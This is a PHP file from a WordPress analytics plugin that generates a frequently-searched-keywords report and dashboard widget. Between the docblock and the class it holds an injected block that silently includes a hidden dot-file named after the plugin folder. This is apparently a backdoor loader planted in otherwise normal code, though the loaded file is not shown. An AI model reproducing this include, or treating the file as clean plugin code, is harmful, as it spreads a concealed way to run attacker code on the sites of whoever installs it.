<?php

/**
 * Frequency Search Report
 *
 * The class handles create a frequency search raports 
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Frequency_Search
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Frequency_Search extends WTBP_WPTAO_Admin_Reports {

	function __construct() {

		parent::__construct( 'frequency-search' );

		$this->report_name = __( 'Most frequently searched keywords', 'wp-tao' );

		// Get keywords only if frequency search report view is active.
		if ( $this->is_active() ) {
			$this->data = $this->get_keywords();
		}

		$this->search_widget();
	}

	/*
	 * Prepare widget for the Wp Tao dashboard
	 */

	private function search_widget() {

		$value = $this->get_keyword_for_widget();

		if ( !empty( $value[ 0 ] ) ) {
			$value = sprintf( '%s (%d)', $value[ 0 ]->value, $value[ 0 ]->frequency );
		} else {
			$value = __( 'No results!', 'wp-tao' );
		}


		$args = array(
			'id'			 => 'most_frequently_searched_keyword',
			'size'			 => 'middle',
			'category'		 => 'traffic',
			'priority'		 => 47,
			'title'			 => __( 'Most frequently searched keyword', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_text'	 => $value,
			'dashicon'		 => 'dashicons-search'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get most frequently keywords
	 */

	public function get_keywords() {
		global $wpdb;

		$e = TAO()->events->table_name;

		$result = $wpdb->get_results( $wpdb->prepare(
		"SELECT value, COUNT(value) AS frequency
		 FROM $e
		 WHERE action = 'search'
		 AND event_ts >= %d
		 AND event_ts <= %d
		 GROUP BY value
		 ORDER BY frequency DESC
		 LIMIT %d;", $this->start_date, $this->end_date, $this->items_per_page ) );

		if ( !empty( $result ) ) {

			return $result;
		}
	}

	/*
	 * Get most frequently keyword for a widget
	 * 
	 * @return bool|array
	 */

	private function get_keyword_for_widget() {

		$ipp_temp				 = $this->items_per_page;
		$this->items_per_page	 = 1;


		$keyword = $this->get_keywords();

		$this->items_per_page = $ipp_temp;

		if ( !empty( $keyword ) ) {
			return $keyword;
		}

		return false;
	}

}
